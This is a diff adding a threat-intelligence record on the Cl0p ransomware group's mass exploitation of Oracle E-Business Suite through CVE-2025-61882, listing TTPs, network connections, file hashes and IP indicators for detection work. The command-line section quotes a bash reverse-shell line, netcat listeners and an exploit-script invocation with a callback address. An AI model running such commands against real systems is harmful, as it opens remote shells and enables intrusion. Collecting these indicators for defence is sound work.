@@ -1,0 +1,44 @@
+description: Mass exploitation of Oracle E-Business Suite via CVE-2025-61882 by Cl0p
+  ransomware group.
+attribution: Cl0p ransomware
+malware_families:
+- Cl0p
+TTPs:
+  processes: []
+  commandline:
+  - '''sh -c /bin/bash -i >& /dev/tcp// 0>&1'''
+  - '''python3 server.py 8808'''
+  - '''nc -lvp 4444'''
+  - '''python3 exp.py http://apps.example.com:8000/ 8.8.8.8:8808'''
+  - '''nc lvp uuuy'''
+  powershell: []
+  scripting_engine:
+  - '''exp.py'''
+  - '''server.py'''
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: python3 server.py
+    destination: 8.8.8.8
+    port: 8808
+  - process: nc
+    destination: 8.8.8.8
+    port: 4444
+  file_activity:
+  - '''/path/to/oracle_ebs_nday_exploit_poc_scattered_lapsus_retard_cl0p_hunters.zip'''
+  - '''/path/to/exp.py'''
+  - '''/path/to/server.py'''
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes:
+  - 76b6d36e04e367a2334c445b51e1ecce97e4c614e88dfb4f72b104ca0f31235d
+  - aa0d3859d6633b62bccfb69017d33a8979a3be1f3f0a5a4bf6960d6c73d41121
+  - 6fd538e4a8e3493dda6f9fcdc96e814bdd14f3e2ef8aa46f0143bff34b882c1b
+  ip_addresses:
+  - 200.107.207.26
+  - 185.181.60.11
+  domains: []
+reference: https://www.resecurity.com/blog/article/cve-2025-61882-mass-exploitation-oracle-e-business-suite-ebs-under-attack-by-cl0p-ransomware
+date_of_publication: October 05, 2025
+file_creation_date: October 10, 2025
